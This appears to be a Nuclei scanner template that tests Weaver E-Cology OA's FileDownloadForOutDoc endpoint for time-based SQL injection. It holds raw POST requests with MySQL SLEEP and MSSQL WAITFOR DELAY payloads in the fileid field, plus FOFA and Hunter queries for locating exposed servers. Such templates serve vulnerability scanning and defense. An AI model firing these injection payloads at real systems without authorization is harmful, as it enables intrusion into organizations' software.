id: weaver-ecology-filedownloadforoutdoc-sqli

info:
  name: 泛微 OA E-Cology filedownloadforoutdoc - sqli
  author: leadlife
  severity: high
  description: EcologyOA filedownloadforoutdoc interface has SQL injection
  reference:
    - https://blog.csdn.net/2301_79099363/article/details/131692158
  metadata:
    verified: false
    hunter-query: product.name="泛微 e-cology 9.0 OA"
    fofa-query: app="泛微-OA（e-cology）"
  tags: ecology,oa,sqli,weaver,time

variables:
  num: '{{rand_int(10, 99)}}'

http:
  - raw:
      - |
        @timeout: 15s
        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close        

        fileid={{num}}+AND+(SELECT+6196+FROM+(SELECT(SLEEP(6)))ovuM)#+xrbN&isFromOutImg=1
  
    matchers:
      - type: dsl
        name: mysql
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and
  
  - raw:
      - |
        @timeout: 15s
        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close        

        fileid={{num}}+WAITFOR DELAY+'0:0:6'&isFromOutImg=1

    matchers:
      - type: dsl
        name: mssql
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and
